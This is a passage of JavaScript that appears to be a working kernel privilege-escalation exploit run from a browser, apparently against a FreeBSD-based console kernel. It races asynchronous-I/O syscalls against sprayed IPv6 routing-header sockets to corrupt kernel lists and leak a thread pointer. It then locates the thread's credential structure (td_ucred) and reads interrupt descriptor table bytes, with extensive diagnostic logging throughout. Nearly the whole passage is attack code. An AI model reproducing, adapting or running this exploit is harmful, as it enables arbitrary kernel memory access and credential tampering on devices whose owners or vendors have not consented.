    const msk2Ab = new ArrayBuffer(CPUSET_SZ);
    keepAlive.push(msk2Ab);
    const msk2Dv = new DataView(msk2Ab),
      msk2Ad = bufAddr(msk2Ab);
    const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
    async function pinWorker(w, c) {
      new Uint8Array(msk2Ab).fill(0);
      msk2Dv.setUint32(0, (1 << c) >>> 0, true);
      await w.fire(SYS.cpuset_setaffinity, aw);
      const rv = w.ctx.frameDv.getUint32(0, true) | 0;
      new Uint8Array(msk2Ab).fill(0);
      await w.fire(SYS.cpuset_getaffinity, aw);
      const back = msk2Dv.getUint32(0, true) >>> 0;
      return { rv: rv, back: back, ok: rv === 0 && back === (1 << c) >>> 0 };
    }
    let OTHER = -1,
      wpin = "none";
    for (let i = otherCores.length - 1; i >= 0; i--) {
      const c = otherCores[i];
      const p1 = await pinWorker(w1, c);
      if (!p1.ok) {
        mark(
          "PIN-WREJECT",
          "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16),
        );
        continue;
      }
      const p2 = await pinWorker(w2, c);
      if (!p2.ok) {
        mark(
          "PIN-WREJECT",
          "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16),
        );
        continue;
      }
      OTHER = c;
      wpin = "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
      break;
    }
    mark(
      "PIN-WSET",
      "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(","),
    );
    if (
      !check(
        "WORKERS-PINNED",
        OTHER >= 0,
        "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
      )
    ) {
      mark(
        "PIN-REFUSE",
        "no worker core verifies apart from main=" +
          PINCORE +
          "; sharing it is the configuration that hangs",
      );
      return;
    }
    mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);

    pinRestore = function () {
      const permitted = (((1 << PINCORE) | (1 << OTHER)) >>> 0) || savedMask;
      function apply(m) {
        new Uint8Array(mskAb).fill(0);
        mskDv.setUint32(0, m, true);
        return sc(
          SYS.cpuset_setaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          ID64,
          CPUSET_SZ,
          mskAd,
        ).i32;
      }
      let used = savedMask,
        r = apply(savedMask);
      if (r !== 0 && permitted !== savedMask) {
        used = permitted;
        r = apply(permitted);
      }
      mark(
        "PIN-RESTORED",
        "rv=" +
          r +
          " mask=0x" +
          used.toString(16) +
          " saved=0x" +
          savedMask.toString(16),
      );
    };

    mark(
      "PR-SATURATE",
      "rv=" +
        sc(
          SYS.aio_submit_cmd,
          1 | 0x1000,
          bufAddr(brqAb),
          NBLOCK,
          3,
          bufAddr(bidAb),
        ).i32,
    );

    const spAb = new ArrayBuffer(8);
    keepAlive.push(spAb);
    const spDv = new DataView(spAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) {
      mark("PR-ABORT", "socketpair");
      return;
    }
    const sp0 = spDv.getInt32(0, true),
      sp1 = spDv.getInt32(4, true);
    opened.push(sp0, sp1);
    const rbAb = new ArrayBuffer(0x40);
    keepAlive.push(rbAb);
    const rqAb = new ArrayBuffer(NUM * 0x28);
    keepAlive.push(rqAb);
    const rqDv = new DataView(rqAb);
    for (let k = 0; k < NUM; k++) {
      const b = k * 0x28;
      put(rqDv, b + 0x08, 0x40);
      put(rqDv, b + 0x10, bufAddr(rbAb));
      rqDv.setInt32(b + 0x20, sp0, true);
    }
    const idAb2 = new ArrayBuffer(NUM * 4);
    keepAlive.push(idAb2);
    const idAd2 = bufAddr(idAb2);
    const stAb2 = new ArrayBuffer(NUM * 4);
    keepAlive.push(stAb2);
    const stDv2 = new DataView(stAb2);
    const stAd2 = bufAddr(stAb2);
    const toAb = new ArrayBuffer(8);
    keepAlive.push(toAb);
    const toDv = new DataView(toAb),
      toAd = bufAddr(toAb);

    const TOWAIT = params.get("towait")
      ? parseInt(params.get("towait"), 10)
      : 1000;
    toDv.setUint32(0, TOWAIT, true);
    toDv.setUint32(4, 0, true);
    mark(
      "PR-TOWAIT",
      "aio_multi_wait timeout=" +
        TOWAIT +
        "us was=100000us" +
        " deaths_in_that_sleep=all armings=4 exposure_was=400ms",
    );
    const POOL = [];
    for (let i = 0; i < SPRAY; i++) {
      const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
      if (fd < 0) break;
      POOL.push(fd);
      opened.push(fd);
    }
    mark(
      "PR-POOL",
      "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd,
    );
    const pAb = new ArrayBuffer(RTH_SIZE);
    keepAlive.push(pAb);
    const pDv = new DataView(pAb),
      pAd = bufAddr(pAb);
    function setNode0(nextAddr, secondDec) {
      new Uint8Array(pAb).fill(0);
      pDv.setUint8(1, RTH_LEN);
      pDv.setUint8(3, RTH_SEGLEFT);
      put(pDv, 0x08, secondDec);
      put(pDv, 0x10, M_AD);
      put(pDv, 0x30, nextAddr);
    }

    const N0DEC = params.get("n0dec") !== "0";
    const SOL_SOCKET = 0xffff,
      SO_TYPE = 0x1008;
    const n0dAb = new ArrayBuffer(8);
    keepAlive.push(n0dAb);
    const n0dDv = new DataView(n0dAb),
      n0dAd = bufAddr(n0dAb);
    function presetNode0Dec() {
      n0dDv.setUint32(0, 4, true);
      n0dDv.setUint32(4, 0, true);
      return sc(SYS.getsockopt, POOL[0], SOL_SOCKET, SO_TYPE, NODE0_DEC, n0dAd)
        .i32;
    }
    let armCount = 0;
    let waitMs = -1;

    let armTrace = false;
    const REAP = params.get("reap") !== "0";
    const REAPLEAK = params.get("reapleak") !== "0";
    const PARK = params.get("park") === "1";
    const LEAKRETRY = params.get("leakretry") === "1";
    const TRACEARM1 = params.get("tracearm1") === "1";
    if (NUM > 2 && !(REAP && REAPLEAK)) {
      mark("PR-REFUSE", "num=" + NUM + " needs reap=1 reapleak=1");
      return;
    }
    let FAKEMISS = params.has("fakemiss")
      ? parseInt(params.get("fakemiss"), 10)
      : -1;
    if (FAKEMISS >= 4) {
      mark("PR-FAKEMISS-REFUSED", "arming=" + FAKEMISS + " writes_kernel");
      FAKEMISS = -1;
    }
    if (FAKEMISS >= 0)
      mark(
        "PR-FAKEMISS",
        "arming=" + FAKEMISS + " armings_are_1_based leak_arming=1",
      );
    let reapedGen = -1;
    let reapAt = 0;
    function armOnce() {
      try {
        if (typeof A !== "undefined" && A) A.busy = 1;
      } catch (e) {}

      const g = armCount + 1;
      const at = function (t, d) {
        if (armTrace) trace(t, "a=" + g + " " + d);
      };
      at("ARM-P1-FREE", "pool=" + POOL.length);
      for (const fd of POOL)
        sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      at("ARM-P2-SUBMIT", "freed=" + POOL.length);
      const rs = sc(
        SYS.aio_submit_cmd,
        1 | 0x1000,
        bufAddr(rqAb),
        NUM,
        3,
        idAd2,
      ).i32;
      if (rs !== 0) {
        at("ARM-SUBMIT-FAIL", "rs=" + rs);
        return "submit=" + rs;
      }

      toDv.setUint32(0, TOWAIT, true);
      toDv.setUint32(4, 0, true);
      at(
        "ARM-P3-WAIT",
        "to=" +
          TOWAIT +
          "us submit=0 to_rb=" +
          toDv.getUint32(0, true) +
          " toad=" +
          toAd,
      );
      const tw0 = Date.now();
      sc(SYS.aio_multi_wait, idAd2, NUM, stAd2, 0, toAd);
      armedEver = true;
      waitMs = Date.now() - tw0;
      let n = 0;
      for (const fd of POOL)
        if (
          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
            .i32 === 0
        )
          n++;
      armCount++;
      at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
      return "ok sprayed=" + n + " wait=" + waitMs + "ms";
    }

    const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK);
    keepAlive.push(lkNodes);
    const lkNdv = new DataView(lkNodes),
      lkNad = bufAddr(lkNodes);
    const lkF64 = new Float64Array(lkNodes);
    const NEXT_F64 = 0x30 / 8,
      STRIDE_F64 = NODE_SZ / 8;
    async function leakCurthread(w) {
      toDv.setUint32(0, TOWAIT, true);
      toDv.setUint32(4, 0, true);
      new Uint8Array(lkNodes).fill(0);
      for (let i = 0; i < N_LEAK; i++) {
        const o = i * NODE_SZ;
        put(lkNdv, o + 0x00, LX);
        put(lkNdv, o + 0x08, LC);
        put(lkNdv, o + 0x10, M_AD);
        put(lkNdv, o + 0x30, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ));
      }
      lkDv.setInt32(0x00, 0x40000000, true);
      lkDv.setInt32(0x10, 0x40000000, true);
      mU32[6] = 4;
      mU32[7] = 0;
      setNode0(lkNad, LC);
      if (N0DEC) {
        const pr0 = presetNode0Dec();
        mark("PR-N0DEC", "rv=" + pr0 + " at=0x" + NODE0_DEC.toString(16));
        if (pr0 !== 0) return null;
      }
      const a = armOnce();
      if (a.indexOf("ok") !== 0) {
        mark("PR-LEAK-ARM", w.name + " " + a);
        return null;
      }

      {
        let wu = 0;
        for (let i = 0; i < 200000; i++) {
          mU8[0x80 + (i & 15)] = i & 0xff;
          wu ^= mU32[OWNER_LO];
        }
        if (wu === 0x7fffffff) mark("PR-WARM", "" + wu);
      }
      const samples = [];
      let hitLo = 0,
        hitHi = 0,
        hits = 0;
      let pr = null;
      try {
        pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
      } catch (e) {}
      for (let i = 0; i < SPIN; i++) {
        mU8[0x80 + (i & 15)] = i & 0xff;
        const hi1 = mU32[OWNER_HI];
        if (hi1 !== 0) {
          const lo = mU32[OWNER_LO];
          const hi2 = mU32[OWNER_HI];

          if (hi1 === hi2 && lo !== 4) {
            if (!hits) {
              hitLo = lo;
              hitHi = hi1;
            }
            hits++;
            if (samples.length < 32)
              samples.push(
                (hi1 >>> 0).toString(16).padStart(8, "0") +
                  (lo >>> 0).toString(16).padStart(8, "0"),
              );
            if (hits > 48) break;
          }
        }
      }
      const drop = 0x40000000 - lkDv.getInt32(0x00, true);
      let cutAt = -1,
        cutTries = 0;
      if (CUT) {
        for (let m = CUT_MARGIN; m <= CUT_MARGIN << 3; m <<= 1) {
          const at = 0x40000000 - lkDv.getInt32(0x00, true) + m;
          if (at >= N_LEAK - 1) break;
          cutTries++;
          lkF64[at * STRIDE_F64 + NEXT_F64] = 0;
          if (0x40000000 - lkDv.getInt32(0x00, true) < at) {
            cutAt = at;
            break;
          }
        }
      }
      const uniq = {};
      for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
      const keys = Object.keys(uniq);
      mark(
        "PR-LEAK",
        w.name +
          " hits=" +
          hits +
          " walked=" +
          drop +
          "/" +
          N_LEAK +
          " samples=" +
          (keys.length
            ? keys.map((k) => k + " x" + uniq[k]).join(" ")
            : "none"),
      );
      try {
        if (pr) await pr;
      } catch (e) {}
      mark(
        "PR-WALK-DONE",
        w.name +
          " walked=" +
          (0x40000000 - lkDv.getInt32(0x00, true)) +
          "/" +
          N_LEAK +
          " broke_at=" +
          drop +
          " cut=" +
          cutAt +
          " tries=" +
          cutTries,
      );
      if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
      return new int64(hitLo >>> 0, hitHi >>> 0);
    }
    if (TRACEARM1) armTrace = true;
    const CT1 = await leakCurthread(w1);
    armTrace = true;

    put(lkNdv, 0x00, LX);
    put(lkNdv, 0x08, LC);
    put(lkNdv, 0x30, 0);
    if (REAPLEAK) {
      mark("PR-REAPLEAK-PRE", "node0 next=0 num=" + NUM);
      const rlc = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
      mark("PR-REAPLEAK-C", "cancel=" + rlc);
      const rlp = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
      mark("PR-REAPLEAK-P", "poll=" + rlp);
      const rld = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
      mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
      reapAt = Date.now();
    } else {
      mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
    }

    if (!CT1) {
      mark("PR-LEAK-MISS", "ct1=null leakretry=" + (LEAKRETRY ? 1 : 0));
      neutralise("leak-miss", 0);
      if (LEAKRETRY && REAPLEAK && retryBenign("leak-miss")) return;
      check("pointer-read-reached", false, "no curthread leak");
      return;
    }

    mark(
      "PR-CURTHREADS",
      "w1=" +
        CT1 +
        " (w2 not leaked: one arming saved)" +
        "  -- both workers are now PARKED and issue no further syscalls",
    );

    let parkFail = "";
    if (!PARK) {
      mark(
        "PR-PARK",
        "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0),
      );
    } else {
      const prev = w1.worker.onmessage;
      w1.worker.onmessage = function (e) {
        const d = e.data || {};

        if (d.id === -1) {
          parkFail += " " + (d.value || d.type);
          return;
        }
        if (prev) prev.call(this, e);
      };
      w1.worker.postMessage({ id: -1, name: "spin", args: [] });
      await new Promise((r) => setTimeout(r, 250));
      mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
    }
    if (
      PARK &&
      !check(
        "W1-PARKED",
        parkFail === "",
        parkFail
          ? "rpc_worker.js has no spin():" +
              parkFail +
              " -- reload, nothing kernel has been touched yet"
          : "w1 cannot reach syscallenter again, so cred_update_thread can" +
              " never crfree() the wild td_ucred passA is about to create",
      )
    )
      return;

    const STEP_OFF = 2,
      STEP_MAG = 0x10000,
      PAIR = STEP_MAG + 1;
    const TD_UCRED_OFF = 0x130,
      CR_RUID_OFF = 0x08;
    const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
    const KB = PAIR;

    const dumAb = new ArrayBuffer(0x40);
    keepAlive.push(dumAb);
    const dumDv = new DataView(dumAb),
      dumAd = bufAddr(dumAb);
    dumDv.setInt32(0x00, 0x40000000, true);
    const DUM = dumAd.add32(0x00);
    const snkAb = new ArrayBuffer(0x40);
    keepAlive.push(snkAb);
    const snkDv = new DataView(snkAb),
      snkAd = bufAddr(snkAb);
    const SNK = snkAd.add32(0x00);
    const N0SINK = snkAd.add32(0x20);

    const MAXN = 2 * KA + KB + 16;
    const arAb = new ArrayBuffer(NODE_SZ * MAXN);
    keepAlive.push(arAb);
    const arDv = new DataView(arAb),
      arAd = bufAddr(arAb);
    mark(
      "PR-ARENA",
      "nodes=" +
        MAXN +
        " bytes=0x" +
        (NODE_SZ * MAXN).toString(16) +
        " @" +
        arAd,
    );

    function wnode(i, decAddr, sinkAddr, last) {
      const o = i * NODE_SZ;
      put(arDv, o + 0x00, decAddr);
      put(arDv, o + 0x08, sinkAddr);
      put(arDv, o + 0x10, M_AD);
      put(arDv, o + 0x18, 0);
      put(arDv, o + 0x20, 0);
      put(arDv, o + 0x28, 0);
      put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ));
    }

    let lastFire = {
      n0: 0,
      fsock: -1,
      fhits: 0,
      faked: false,
      label: "none",
    };

    function neutralise(where, sink) {
      setNode0(0, sink);
      let renew = 0;
      for (const fd of POOL)
        if (
          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
            .i32 === 0
        )
          renew++;
      mark(
        "PR-NEUTRALISE-EARLY",
        where + " next=0 on " + renew + "/" + POOL.length,
      );
    }

    function fireOk(where) {
      if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
      mark(
        "REFUSING-TO-INTERPRET",
        where +
          " node0_sink=" +
          lastFire.n0 +
          " f_socket=" +
          lastFire.fsock +
          " forced=" +
          (lastFire.faked ? 1 : 0),
      );
      neutralise(where, N0SINK);
      return false;
    }

    const gfAb = new ArrayBuffer(RTH_SIZE);
    keepAlive.push(gfAb);
    const gfDv = new DataView(gfAb),
      gfAd = bufAddr(gfAb);
    const glAb = new ArrayBuffer(8);
    keepAlive.push(glAb);
    const glDv = new DataView(glAb),
      glAd = bufAddr(glAb);
    function whoHasF() {
      let found = -1,
        hits = 0,
        state0 = 0;
      for (let i = 0; i < POOL.length; i++) {
        glDv.setInt32(0, RTH_SIZE, true);
        glDv.setInt32(4, 0, true);
        new Uint8Array(gfAb).fill(0);
        if (
          sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd)
            .i32 !== 0
        )
          continue;
        const st = gfDv.getUint32(0x20, true) >>> 0;
        if (st !== 0) {
          hits++;
          if (found < 0) {
            found = i;
            state0 = st;
          }
        }
      }
      return { idx: found, hits: hits, state: state0 };
    }

    function reapNow(tag) {
      if (!REAP || reapedGen === armCount) return;
      wnode(0, DUM, DUM, true);
      reapedGen = armCount;
      const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
      let stsC = "";
      for (let k = 0; k < NUM; k++)
        stsC +=
          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      const p = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
      let stsP = "";
      for (let k = 0; k < NUM; k++)
        stsP +=
          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
      let sts = "";
      for (let k = 0; k < NUM; k++)
        sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      reapAt = Date.now();
      post(
        "REAP",
        tag +
          " gen=" +
          reapedGen +
          " cancel=" +
          c +
          " poll=" +
          p +
          " delete=" +
          d +
          " c=[" +
          stsC +
          "] p=[" +
          stsP +
          "] st=[" +
          sts +
          "]",
      );
    }

    const firesArg = parseInt(params.get("fires") || "", 10);
    const FIRES =
      Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1
        ? firesArg
        : NUM - 1;
    let fireIdx = FIRES;
    mark("PR-AMORTISE", "num=" + NUM + " fires_per_arming=" + FIRES);

    function runChain(nNodes, label) {
      snkDv.setInt32(0x00, 0x40000000, true);
      snkDv.setInt32(0x20, 0x40000000, true);

      trace(
        "CH-MTX-PRE",
        label +
          " owner=" +
          (mU32[OWNER_HI] >>> 0).toString(16) +
          ":" +
          (mU32[OWNER_LO] >>> 0).toString(16) +
          " want=0:4",
      );
      mU32[OWNER_LO] = 4;
      mU32[OWNER_HI] = 0;
      let a = "ok reused";
      if (fireIdx >= FIRES) {
        const n0save = arAb.slice(0, NODE_SZ);
        reapNow("pre-arm a=" + armCount);
        new Uint8Array(arAb, 0, NODE_SZ).set(new Uint8Array(n0save));
        setNode0(arAd, N0SINK);
        a = armOnce();
        if (a.indexOf("ok") !== 0) {
          mark("PR-ARM-FAIL", label + " " + a);
          return null;
        }
        fireIdx = 0;
      } else {
        setNode0(arAd, N0SINK);
      }
      const fireN = fireIdx;
      sc(SYS.aio_multi_cancel, idAd2.add32(4 * fireIdx), 1, stAd2);
      fireIdx++;
      trace(
        "CH-CANCEL-DONE",
        label +
          " nodes=" +
          nNodes +
          " fire=" +
          fireN +
          "/" +
          FIRES +
          " arm=" +
          armCount +
          " returned",
      );
      const moved = 0x40000000 - snkDv.getInt32(0x00, true);
      const w = whoHasF();
      const faked = FAKEMISS >= 0 && armCount === FAKEMISS;
      const n0 = faked ? 0 : 0x40000000 - snkDv.getInt32(0x20, true);
      lastFire = {
        n0: n0,
        fsock: w.idx,
        fhits: w.hits,
        faked: faked,
        label: label,
      };
      mark(
        "PR-FIRE",
        label +
          " nodes=" +
          nNodes +
          " sink_moved=" +
          moved +
          " node0_sink=" +
          n0 +
          " forced=" +
          (faked ? 1 : 0) +
          " f_socket=" +
          w.idx +
          " f_hits=" +
          w.hits +
          " state=0x" +
          w.state.toString(16) +
          " (" +
          a +
          ")",
      );
      if (n0 === 1 && w.idx < 0)
        mark(
          "PR-F-UNSEEN",
          "node0 fired but no pool socket carries the" +
            " state write -- F went to something outside the pool",
        );
      return moved;
    }

    const X1 = CT1.add32(TD_UCRED_OFF);
    mark(
      "PR-PASSA-TARGET",
      "X1 = w1.curthread+0x130 (td_ucred) = " +
        X1 +
        "  KA=" +
        KA +
        " pair=0x" +
        PAIR.toString(16) +
        " covers up to " +
        KA * PAIR,
    );
    {
      let i = 0;
      for (let j = 0; j < KA; j++) {
        wnode(i++, X1.add32(STEP_OFF), DUM, false);
        wnode(i++, X1, SNK, false);
      }

      const subA = (0x100000000 - ((KA * PAIR) % 0x100000000)) % 0x100000000;
      const dA = [
        subA & 0xff,
        (subA >>> 8) & 0xff,
        (subA >>> 16) & 0xff,
        (subA >>> 24) & 0xff,
      ];
      const nA = dA[0] + dA[1] + dA[2] + dA[3];
      mark(
        "PR-RESTOREA",
        "passA subtracted " +
          KA * PAIR +
          " sub=0x" +
          subA.toString(16) +
          " digits=" +
          dA.join(",") +
          " nodes=" +
          nA,
      );
      if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA))
        return;
      {
        const pa = [];
        for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) pa.push(j);
        for (let j = 0; j < pa.length; j++)
          wnode(i++, X1.add32(pa[j]), DUM, j === pa.length - 1);
      }
      const mA = runChain(i, "passA");
      if (mA === null) return;
      if (!fireOk("passA")) return;
      if (mA <= 0) {
        mark(
          "PR-PASSA-NOCROSS",
          "no crossing: low dword either exceeds " +
            KA * PAIR +
            " or is already negative (top bit set)",
        );
        if (retryBenign("passA-nocross")) return;
        check("POINTER-READ", false, "pass A found no crossing");
        return;
      }
      var kA = KA - mA + 1;
      mark(
        "PR-PASSA",
        "m=" +
          mA +
          " -> k=" +
          kA +
          "  W0 in (" +
          (kA - 1) * PAIR +
          ", " +
          kA * PAIR +
          "]",
      );
    }

    const RED = (kA - 1) * PAIR;
    const dga = [
      RED & 0xff,
      (RED >>> 8) & 0xff,
      (RED >>> 16) & 0xff,
      (RED >>> 24) & 0xff,
    ];
    const nDga = dga[0] + dga[1] + dga[2] + dga[3];
    mark(
      "PR-RESTORE-PLAN",
      "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga,
    );
    if (
      !check(
        "pr-restore-bounded",
        nDga > 0 && nDga <= 1020 && RED > 0,
        "n=" + nDga,
      )
    )
      return;
    const X2 = X1;
    mark(
      "PR-PASSB-TARGET",
      "x2=" + X2 + " same_copy=1 restore_digits=" + nDga + " probes=" + KB,
    );
    let W0 = 0;
    {
      let i = 0;
      const posA = [];
      for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) posA.push(j);
      for (let j = 0; j < posA.length; j++)
        wnode(i++, X2.add32(posA[j]), DUM, false);
      for (let j = 0; j < KB; j++) wnode(i++, X2, SNK, false);

      const totB = (RED + KB) % 0x100000000;
      const subB = (0x100000000 - totB) % 0x100000000;
      const dB = [
        subB & 0xff,
        (subB >>> 8) & 0xff,
        (subB >>> 16) & 0xff,
        (subB >>> 24) & 0xff,
      ];
      const nB = dB[0] + dB[1] + dB[2] + dB[3];
      mark(
        "PR-RESTOREB",
        "passB subtracted " +
          totB +
          " sub=0x" +
          subB.toString(16) +
          " digits=" +
          dB.join(",") +
          " nodes=" +
          nB,
      );

      if (
        !check(
          "pr-restoreb-bounded",
          nB >= 1 && nB <= 1020,
          "n=" + nB + " min=1 max=1020 unterminated_if=0",
        )
      ) {
        mark("REFUSING-TO-ARM", "reason=passb-restore-empty");
        return;
      }
      {
        const pb = [];
        for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) pb.push(j);
        for (let j = 0; j < pb.length; j++)
          wnode(i++, X2.add32(pb[j]), DUM, j === pb.length - 1);
      }
      const mB = runChain(i, "passB");
      if (mB === null) return;
      if (!fireOk("passB")) return;
      if (mB <= 0) {
        mark(
          "PR-PASSB-NOCROSS",
          "remainder never crossed -- k may be off" +
            " by one, or the two threads' td_proc differ",
        );
        if (retryBenign("passB-nocross")) return;
        check("POINTER-READ", false, "pass B found no crossing");
        return;
      }
      const R = KB - mB + 1;
      W0 = (kA - 1) * PAIR + R;
      mark(
        "PR-PASSB",
        "m=" +
          mB +
          " -> R=" +
          R +
          "  => low dword = " +
          W0 +
          " (0x" +
          (W0 >>> 0).toString(16) +
          ")",
      );
    }

    const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
    mark(
      "PR-UCRED",
      "ucred = " +
        UCRED +
        "  (high dword taken from the leaked" +
        " curthread prefix 0x" +
        (CT1.hi >>> 0).toString(16) +
        ")",
    );
    check(
      "pointer-read-shape-ok",
      W0 >>> 0 !== 0 && ((W0 >>> 0) & 7) === 0,
      "low=0x" +
        (W0 >>> 0).toString(16) +
        " 8-byte aligned=" +
        (((W0 >>> 0) & 7) === 0),
    );
    // Read phase is done: the remaining armings (anchor, caps) touch the
    // kernel, so from here a failure must NOT auto-reload. Reset the counter
    // so the next manual run starts fresh.
    clearRetry();

    const IDT = new int64(0x00001a00, 0xffffff80);
    const GATE_SZ = 16;

    const RVA_RSVD = off.k_idt_rsvd;
    const STEPMAG = 0x1000000;
    const SWEEP = params.get("sweep") ? parseInt(params.get("sweep"), 10) : 256;

    const B = {};
    const JOBS = [
      {
        n: "b0",
        j: 0,
        g: 22,
        want: null,
        low: function () {
          return 0x000000;
        },
      },
      {
        n: "b1",
        j: 1,
        g: 24,
        want: null,
        low: function () {
          return (B.b0 << 16) >>> 0;
        },
      },
      {
        n: "b3",
        j: 3,
        g: 25,
        want: 0x00,
        low: function () {
          return ((0x20 << 16) | (B.b1 << 8) | B.b0) >>> 0;
        },
      },
      {
        n: "b5",
        j: 5,
        g: 26,
        want: 0x8e,
        low: function () {
          return 0x000020;
        },
      },
      {
        n: "b6",
        j: 6,
        g: 27,
        want: null,
        low: function () {
          return 0x8e0000;
        },
      },
      {
        n: "b7",
        j: 7,
        g: 31,
        want: null,
        low: function () {
          return ((B.b6 << 16) | 0x8e00) >>> 0;
        },
      },
      {
        n: "b6d",
        j: 6,
        g: 20,
        want: null,
        low: function () {
          return 0x8e0000;
        },
      },
      {
        n: "b7d",
        j: 7,
        g: 15,
        want: null,
        low: function () {
          return ((B.b6 << 16) | 0x8e00) >>> 0;
        },
      },
    ];
    const NJ = JOBS.length,
      NEED = NJ * SWEEP * 2;

    mark(
      "ANCHOR-PLAN",
      "idt=" +
        IDT +
        " rsvd_rva=0x" +
        RVA_RSVD.toString(16) +
        " jobs=" +
        NJ +
        " sweep=" +
        SWEEP +
        " nodes=" +
        NEED +
        " gates=" +
        JOBS.map(function (q) {
          return q.g;
        }).join(",") +
        " armings_so_far=" +
        armCount,
    );
    if (
      !check(
        "anchor-nodes-bounded",
        NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
        "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP,
      )
    )
      return;

    {
      let lo = 0x1000000,
        hi = -1;
      for (let q = 0; q < NJ; q++) {
        const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
        if (o - 3 < lo) lo = o - 3;
        if (o + 3 > hi) hi = o + 3;
      }
      if (
        !check(
          "anchor-inside-idt",
          lo >= 0 && hi < 0x1000,
          "lo=+0x" +
            lo.toString(16) +
            " hi=+0x" +
            hi.toString(16) +
            " limit=0x1000",
        )
      )
        return;
      mark(
        "ANCHOR-SPAN",
        "from=" +
          IDT.add32(lo) +
          " to=" +
          IDT.add32(hi) +
          " gates=15,20-27,31 reserved=1",
      );
    }

    const anAb = new ArrayBuffer(4 * NJ * SWEEP);
    keepAlive.push(anAb);
    const anDv = new DataView(anAb),
      anAd = bufAddr(anAb);
    for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 0x40000000, true);

    {
      let idx = 0;
      for (let q = 0; q < NJ; q++) {
        const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
        const stepAd = IDT.add32(o);
        const probeAd = IDT.add32(o - 3);
        for (let k = 0; k < SWEEP; k++) {
          wnode(idx++, stepAd, DUM, false);
          wnode(idx++, probeAd, anAd.add32((q * SWEEP + k) * 4), false);
        }
      }
      put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
      if (runChain(idx, "anchor-sweep") === null) return;
      if (!fireOk("anchor-sweep")) return;
    }

    function simPattern(bv, low) {
      let w = ((bv << 24) >>> 0) | (low & 0xffffff) | 0;
      let out = "";
      for (let k = 0; k < SWEEP; k++) {
        w = (w - STEPMAG) | 0;
        w = (w - 1) | 0;
        out += w <= 0 ? "1" : "0";
      }
      return out;
    }
    function decodeByte(obs, low) {
      let hit = -1,
        n = 0;
      for (let bv = 0; bv < 256; bv++)
        if (simPattern(bv, low) === obs) {
          if (hit < 0) hit = bv;
          n++;
        }
      return { b: hit, n: n };
    }

    let bad = 0;
    for (let q = 0; q < NJ; q++) {
      const J = JOBS[q];
      let obs = "",
        ones = 0,
        edge = -1;
      for (let k = 0; k < SWEEP; k++) {
        const f = 0x40000000 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0;
        obs += f ? "1" : "0";
        if (f) ones++;
        if (k > 0 && obs.charCodeAt(k) !== obs.charCodeAt(k - 1) && edge < 0)
          edge = k;
      }

      const low = J.low();
      const d = decodeByte(obs, low);
      B[J.n] = d.b;
      if (d.b < 0 || d.n !== 1) bad++;
      mark(
        "ANCHOR-BYTE",
        J.n +
          " gate=" +
          J.g +
          " j=" +
          J.j +
          " low=0x" +
          low.toString(16) +
          " ones=" +
          ones +
          " edge=" +
          edge +
          " cands=" +
          d.n +
          " val=" +
          (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)),
      );
      if (J.want !== null)
        check(
          "anchor-control-" + J.n,
          d.b === J.want,
          "want=0x" +
            J.want.toString(16) +
            " got=" +
            (d.b < 0 ? "none" : "0x" + d.b.toString(16)),
        );
    }
    if (
      !check(
